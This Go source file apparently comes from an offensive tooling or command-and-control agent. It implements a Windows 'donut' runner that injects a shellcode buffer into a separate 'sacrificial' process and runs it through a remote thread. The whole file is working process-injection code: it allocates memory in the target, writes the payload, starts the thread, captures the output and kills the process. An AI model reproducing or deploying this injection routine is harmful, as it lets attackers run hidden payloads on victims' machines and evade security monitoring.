// +build windows

package donut

import (
	"syscall"
	"unsafe"
)

// Runner runner
func Runner(donut []byte, handle syscall.Handle, stdout syscall.Handle, stdoutBytes *[]byte, stderr syscall.Handle, stderrBytes *[]byte, eventCode *uint32) (bool, error) {

	address, err := VirtualAllocEx(handle, 0, uintptr(len(donut)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READ)
	if checkErrorMessage(err) {
		return false, err
	}

	var bytesWritten uintptr

	_, err = WriteProcessMemory(handle, address, (uintptr)(unsafe.Pointer(&donut[0])), uintptr(len(donut)), &bytesWritten)
	if checkErrorMessage(err) {
		return false, err
	}
	var threadHandle syscall.Handle

	threadHandle, err = CreateRemoteThread(handle, nil, 0, address, 0, 0, 0)
	if checkErrorMessage(err) {
		return false, err
	}

	err = ReadFromPipes(stdout, stdoutBytes, stderr, stderrBytes)
	if checkErrorMessage(err) {
		return false, err
	}

	*eventCode, err = WaitForSingleObject(threadHandle, 0xFFFFFFFF)
	if checkErrorMessage(err) {
		return false, err
	}

	//Close the thread handle
	err = syscall.CloseHandle(threadHandle)
	if checkErrorMessage(err) {
		return false, err
	}

	//Terminate the sacrificial process
	err = TerminateProcess(handle, 0)

	//close Process Handle
	err = syscall.CloseHandle(handle)
	if checkErrorMessage(err) {
		return false, err
	}

	//close stdout Handle
	err = syscall.CloseHandle(stdout)
	if checkErrorMessage(err) {
		return false, err
	}

	//close stderr Handle
	err = syscall.CloseHandle(stderr)
	if checkErrorMessage(err) {
		return false, err
	}

	return true, err
}

func Cleanup(prochandle syscall.Handle, threadHandle syscall.Handle, stdout syscall.Handle, stderr syscall.Handle) (err error) {

	//Close the thread handle
	err = syscall.CloseHandle(threadHandle)
	if checkErrorMessage(err) {
		return err
	}

	//Terminate the sacrificial process
	err = TerminateProcess(prochandle, 0)
	if checkErrorMessage(err) {
		return err
	}

	//close Process Handle
	err = syscall.CloseHandle(prochandle)
	if checkErrorMessage(err) {
		return err
	}

	//close stdout Handle
	err = syscall.CloseHandle(stdout)
	if checkErrorMessage(err) {
		return err
	}

	//close stderr Handle
	err = syscall.CloseHandle(stderr)
	if checkErrorMessage(err) {
		return err
	}

	return err

}

// IsAvailable does a donut runner exist
func IsAvailable() bool {

	// Always returns true because only ntdll and kernel32 are referenced and they are always available
	return true
}

func checkErrorMessage(err error) bool {
	if err != nil && err.Error() != "The operation completed successfully." {
		println(err.Error())
		return true
	}
	return false
}
